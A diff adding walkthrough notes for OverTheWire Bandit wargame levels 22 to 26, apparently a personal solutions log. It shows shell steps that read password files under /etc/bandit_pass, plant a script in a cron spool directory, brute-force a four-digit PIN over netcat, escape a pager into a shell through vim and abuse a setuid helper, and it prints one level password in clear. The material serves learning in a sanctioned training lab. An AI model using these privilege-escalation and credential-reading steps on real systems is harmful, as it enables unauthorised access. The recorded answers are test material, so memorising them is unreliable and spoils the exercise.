@@ -190,3 +190,60 @@ bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
 bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
 bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ```
+
+### Level 22
+```bash
+sshpass -p $(cat passwords/22) ssh bandit22@bandit.labs.overthewire.org -p 2220
+bandit22@bandit:~$ cd /etc/cron.d/
+bandit22@bandit:/etc/cron.d$ ls
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+bandit22@bandit:/etc/cron.d$ myname=bandit23
+bandit22@bandit:/etc/cron.d$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+bandit22@bandit:/etc/cron.d$ echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+bandit22@bandit:/etc/cron.d$ cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+### Level 23
+```bash
+sshpass -p $(cat passwords/23) ssh bandit23@bandit.labs.overthewire.org -p 2220
+bandit23@bandit:~$ cd /etc/cron.d/
+bandit23@bandit:/etc/cron.d$ ls
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+bandit23@bandit:/etc/cron.d$ nano /tmp/getpass.sh
+bandit23@bandit:/etc/cron.d$ chmod +x /tmp/getpass.sh
+bandit23@bandit:/etc/cron.d$ cp /tmp/getpass.sh /var/spool/bandit24/foo/
+bandit23@bandit:/etc/cron.d$ cat /tmp/bandit24_pass
+```
+
+### Level 24
+```bash
+sshpass -p $(cat passwords/24) ssh bandit24@bandit.labs.overthewire.org -p 2220
+bandit24@bandit:~$ PASS=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+bandit24@bandit:~$ for i in {0000..9999}; do   echo "$PASS $i"; done | nc localhost 30002
+```
+
+### Level 25
+```bash
+sshpass -p $(cat passwords/25) ssh bandit25@bandit.labs.overthewire.org -p 2220
+bandit25@bandit:~$ ls
+bandit25@bandit:~$ exit
+rahul@rahul:~$ scp -P 2220 bandit25@bandit.labs.overthewire.org:bandit26.sshkey .
+rahul@rahul:~$ ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220 # Check connection is successful or not. If yes, then resize the screen to bare minimum size.
+rahul@rahul:~$ # Once logged in again, press v to open vim editor and type `:e /etc/bandit_pass/bandit26`
+rahul@rahul:~$ # Copy paste the password to a file and close the connection.
+```
+
+### Level 26
+```bash
+# Log In by resize the screen to bare minimum
+sshpass -p $(cat passwords/26) ssh bandit26@bandit.labs.overthewire.org -p 2220
+# Press v and type :set shell=/bin/bash
+# and type :shell
+bandit26@bandit:~$ ls
+bandit26@bandit:~$ ./bandit27-do
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit27
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+```
